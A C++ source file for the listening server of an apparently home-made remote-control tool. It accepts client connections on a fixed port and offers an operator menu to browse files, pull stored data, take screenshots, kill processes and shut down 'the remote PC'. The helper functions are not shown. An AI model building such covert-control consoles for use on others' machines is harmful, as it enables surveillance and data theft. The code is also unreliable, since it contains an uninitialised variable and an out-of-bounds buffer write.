#include "Server.h"

int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nFunsterStil)
{
	


  int res;
  char username[128];
  time_t ct;
  //_setmode(_fileno(stdout), _O_U16TEXT); 
  WSADATA wsaData;
  int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
  if (iResult != NO_ERROR) return 1;
  
  SOCKET sock;
  sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (sock == INVALID_SOCKET) return 1;
  
  sockaddr_in service;
  service.sin_family = AF_INET;
  
  service.sin_addr.s_addr = inet_addr("192.168.1.230");
  
  service.sin_port = htons(26000);

  if (bind( sock, (SOCKADDR*) &service, sizeof(service)) == SOCKET_ERROR)
  {
    closesocket(sock);
    return 1;
  }


  if (listen( sock, SOMAXCONN ) == SOCKET_ERROR) return 1;

  SOCKET asock;
  long curtime, lastime;

  while (1)
  {
          
          wcout << "\n Accepting Connections..." << endl;
    
          asock = accept( sock, NULL, NULL );
          if (asock == INVALID_SOCKET)
          {
            closesocket(sock);
            WSACleanup();
            return 1;
          }
          curtime = time(NULL);
          if ((curtime - lastime) > 15) PlaySound(TEXT("NewConnection.wav"), NULL, SND_FILENAME | SND_ASYNC | SND_LOOP);
          char command[1024], response[1024];
          string totr;
          
          strncpy(command, "OK+",1024);
          send(asock, command, (int) strlen(command), 0);
          
          totr.clear();
          do
          {
                     res = recv(asock, response, 1024, 0);
                     response[res] = '\0';
                     totr += response;
          } while (totr[totr.length() - 1] != '+');
          totr.erase(totr.length() - 1, 1);
          
          strncpy(username, totr.c_str(),128);
          
          system("cls");
          
          cout << endl << endl << " Client <" << username << "> connected..." << endl;
          string choice;
          do 
          {
               cout << endl;
               cout << " What would you like to do with the remote PC?\n" << endl;
               cout << " 1. Nothing, close the Connection" << endl;
               cout << " 2. Synchronize" << endl;
               cout << " 3. Access stored Data" << endl;
               cout << " 4. Browse FileSystem" << endl;
               cout << " 5. Terminate a Process" << endl;
               cout << " 6. Take a Screenshot" << endl;
               cout << " 7. Create a Message Box" << endl;
               cout << " 8. Edit Parameters" << endl;
               cout << " 9. Uninstall the Software" << endl;
               cout << " 10. Restart" << endl;
               cout << " 11. Shut Down" << endl;
               cout << "\n type a number (1-11): ";
               getline(cin, choice);
          } while ((choice != "1") && (choice != "2") && (choice != "3") && (choice != "4")
                && (choice != "5") && (choice != "6") && (choice != "7") && (choice != "8")
                && (choice != "9") && (choice != "10") && (choice != "11"));
                PlaySound(NULL, 0, 0);
                system("cls");
          switch (atoi(choice.c_str()))
          {
                 case 1: disconnect(asock, username);                         
                         break;
                         
                 case 2: synchronize(asock, username);
                         break;
                         
                 case 3: download(asock, username);
                         break;
                         
                 case 4: browse(asock, username);
                         break;
                         
                 case 5: terminate(asock);
                         break;
     
                 case 6: screenshot(asock, username);
                         break;
                         
                 case 7: messagebox(asock);
                         break;
                         
                 case 8: editparams(asock);
                         break;
                         
                 case 9: uninstall(asock);
                         break;
                         
                 case 10: shutdown(false, asock);
                         break;
                         
                 case 11: shutdown(true, asock);
                         break;
                         
          }
          cout << endl;
          for (int p = 1 ; p <= 3 ; p ++)
          {
              Sleep(700);
              cout << " ." << endl;
          }
          Sleep(700);
          closesocket(asock);
          lastime = time(NULL);
    }
  
  return 0;
}
